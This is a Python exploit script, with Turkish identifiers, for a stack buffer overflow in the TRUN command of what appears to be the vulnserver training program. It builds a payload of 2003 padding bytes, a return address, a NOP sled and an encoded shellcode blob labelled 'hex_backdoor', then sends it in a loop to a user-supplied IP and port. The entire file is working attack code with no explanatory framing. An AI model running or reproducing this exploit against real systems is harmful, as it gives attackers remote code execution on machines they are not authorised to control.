import socket
import sys
import optparse
from optparse import OptionParser
import subprocess

Parser = OptionParser()
Parser.add_option("-i", "--ip", dest="ip", help="\tip adresi degeri")
Parser.add_option("-p", "--port", dest="port", help="\tport numarası degeri")
(kullanici_girdisi, arguments) = Parser.parse_args()

ip_a = kullanici_girdisi.ip
ports = int(kullanici_girdisi.port)

hex_backdoor = ("\xd9\xc7\xd9\x74\x24\xf4\x5e\xba\xd7\x8f\xde\x3c\x31\xc9"
                "\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\x81\x9c\x3c\xc9\xd1"
                "\x4b\x42\x32\x29\x8c\x23\xba\xcc\xbd\x63\xd8\x85\xee\x53"
                "\xaa\xcb\x02\x1f\xfe\xff\x91\x6d\xd7\xf0\x12\xdb\x01\x3f"
                "\xa2\x70\x71\x5e\x20\x8b\xa6\x80\x19\x44\xbb\xc1\x5e\xb9"
                "\x36\x93\x37\xb5\xe5\x03\x33\x83\x35\xa8\x0f\x05\x3e\x4d"
                "\xc7\x24\x6f\xc0\x53\x7f\xaf\xe3\xb0\x0b\xe6\xfb\xd5\x36"
                "\xb0\x70\x2d\xcc\x43\x50\x7f\x2d\xef\x9d\x4f\xdc\xf1\xda"
                "\x68\x3f\x84\x12\x8b\xc2\x9f\xe1\xf1\x18\x15\xf1\x52\xea"
                "\x8d\xdd\x63\x3f\x4b\x96\x68\xf4\x1f\xf0\x6c\x0b\xf3\x8b"
                "\x89\x80\xf2\x5b\x18\xd2\xd0\x7f\x40\x80\x79\x26\x2c\x67"
                "\x85\x38\x8f\xd8\x23\x33\x22\x0c\x5e\x1e\x2b\xe1\x53\xa0"
                "\xab\x6d\xe3\xd3\x99\x32\x5f\x7b\x92\xbb\x79\x7c\xd5\x91"
                "\x3e\x12\x28\x1a\x3f\x3b\xef\x4e\x6f\x53\xc6\xee\xe4\xa3"
                "\xe7\x3a\xaa\xf3\x47\x95\x0b\xa3\x27\x45\xe4\xa9\xa7\xba"
                "\x14\xd2\x6d\xd3\xbf\x29\xe6\xd6\x3f\x33\xf9\x8e\x3d\x33"
                "\x14\x13\xcb\xd5\x7c\xbb\x9d\x4e\xe9\x22\x84\x04\x88\xab"
                "\x12\x61\x8a\x20\x91\x96\x45\xc1\xdc\x84\x32\x21\xab\xf6"
                "\x95\x3e\x01\x9e\x7a\xac\xce\x5e\xf4\xcd\x58\x09\x51\x23"
                "\x91\xdf\x4f\x1a\x0b\xfd\x8d\xfa\x74\x45\x4a\x3f\x7a\x44"
                "\x1f\x7b\x58\x56\xd9\x84\xe4\x02\xb5\xd2\xb2\xfc\x73\x8d"
                "\x74\x56\x2a\x62\xdf\x3e\xab\x48\xe0\x38\xb4\x84\x96\xa4"
                "\x05\x71\xef\xdb\xaa\x15\xe7\xa4\xd6\x85\x08\x7f\x53\xa5"
                "\xea\x55\xae\x4e\xb3\x3c\x13\x13\x44\xeb\x50\x2a\xc7\x19"
                "\x29\xc9\xd7\x68\x2c\x95\x5f\x81\x5c\x86\x35\xa5\xf3\xa7"
                "\x1f")

veri_gonder = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + hex_backdoor

while True:
    try:
        baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        baglanti.connect((str(ip_a), ports))
        veri_isle = veri_gonder.encode(encoding="latin1")
        baglanti.send(veri_isle)
        baglanti.close()

    except KeyboardInterrupt:
        subprocess.call(["clear"])
        print("\n'CTRL' + C basıldı")
        sys.exit()

    except Exception as E:
        subprocess.call(["clear"])
        print(E)
        sys.exit()
